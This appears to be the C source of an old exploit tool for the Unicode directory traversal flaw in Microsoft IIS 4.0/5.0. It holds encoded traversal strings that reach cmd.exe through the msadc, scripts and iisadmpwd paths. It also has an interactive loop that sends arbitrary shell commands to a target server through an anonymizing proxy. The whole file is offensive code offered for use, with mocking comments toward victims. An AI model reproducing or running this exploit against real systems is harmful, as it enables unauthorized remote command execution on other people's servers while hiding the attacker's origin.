/* hack IIS 4.0/5.0 with the usefull UNICODE :) and have fun */
/* coded by zipo */
/* to compile: cc -o iisuni iisuni.c */
/* made for all the lame populus :) */
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>
#include <netdb.h>
#define BUFF_LEN 6000
#define HTTP " HTTP/1.0\r\n\r\n"
#define GET "GET http://"
/* this is the anonymous server used */
#define ANON "anon.free.anonymizer.com"
/* this are all the types of bugs */
#define BUG1_STR
"/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+"
#define BUG2_STR "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+"
#define BUG3_STR
"/iisadmpwd/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+"
#define BUG4_STR "/"
/* this is the IIS http server port */
#define HTTP_PORT 80
int main (int argc, char *argv[]) {
   struct sockaddr_in sin;
   struct hostent *he;
   char *bug,cmd[BUFF_LEN],recbuffer[BUFF_LEN],buffer[BUFF_LEN];
   int sck, i;
   if (argc < 3)
     bad_params (argv[0]);
   switch (atoi(argv[2])) {
    case 1:
      bug = BUG1_STR;
      break;
    case 2:
      bug = BUG2_STR;
      break;
    case 3:
      bug = BUG3_STR;
      break;
    case 4:
      bug = BUG4_STR;
      break;
    default:
      printf ("Number error\n");
      exit(1);
   }
   while (1) {
      printf ("bash# ");
      fgets (cmd, sizeof(cmd), stdin);
      cmd[strlen(cmd)-1] = '\0';
      if (strcmp(cmd, "exit")) {
      	 if (!strcmp(cmd, "clear")) {
	    system("clear");
	    continue;
	 } else if (!strcmp(cmd, "")) {
	    continue;
	 } else if (!strcmp(cmd, "?")) {
	    printf ("Just you need to type in the prompt the M$DOS
command\n");
	    printf ("to exit type \"exit\" :)\n");
	    continue;
	 }
	 /* prepare the string to be sent */
	 for (i=0;i<=strlen(cmd);i++) {
	    if (cmd[i] == 0x20)
	      cmd[i] = 0x2b;
	 }
	 sprintf (buffer, "%s%s%s%s%s", GET, argv[1], bug, cmd, HTTP);
	 /* get ip */
	 if ((he = gethostbyname (ANON)) == NULL) {
	    herror ("host error");
	    exit (1);
	 }
	 /* setup port and other parameters */
	 sin.sin_port = htons (HTTP_PORT);
	 sin.sin_family = AF_INET;
	 memcpy (&sin.sin_addr.s_addr, he->h_addr, he->h_length);
	 /* create a socket */
	 if ((sck = socket (AF_INET, SOCK_STREAM, 6)) < 0) {
	    perror ("socket() error");
	    exit (1);
	 }
	 /* connect to the sucker */
	 if ((connect (sck, (struct sockaddr *) &sin, sizeof (sin))) < 0) {
	    perror ("connect() error");
	    exit (1);
	 }
	 /* send the beautifull string */
	 write (sck, buffer, sizeof(buffer));
	 /* recive all ! :) */
	 read (sck, recbuffer, sizeof(recbuffer));
	 /* and print it */
	 recbuffer[strlen(recbuffer)-1]='\0';
	 printf
("\033[0;7m-------------------------------------Received--------------------
---------------\n");
	 printf
("%s\n---------------------------------------Done---------------------------
----------\n\033[7;0m", recbuffer);
	 /* close the socket ... not needed any more */
	 close (sck);
	 /* put zero's in the buffers */
	 bzero (buffer, sizeof(buffer));
	 bzero (recbuffer, sizeof(recbuffer));
      } else {
	 /* you type "exit" cya :) */
	 exit(0);
      }
   }
}
/* you miss a parameter :'-( */
int bad_params (char *prog_name) {
   fprintf (stdout, "usage:\n\t%s <hostname> <number>\n", prog_name);
   fprintf (stdout,
"-------------------------------------------------------\n");
   fprintf (stdout, "<1> msadc\t");
   fprintf (stdout, "<2> scripts\t");
   fprintf (stdout, "<3> iisadmpwd\t");
   fprintf (stdout, "<4> /\n");
   fprintf (stdout,
"-------------------------------------------------------\n");
   exit (1);
}
/* EOF */
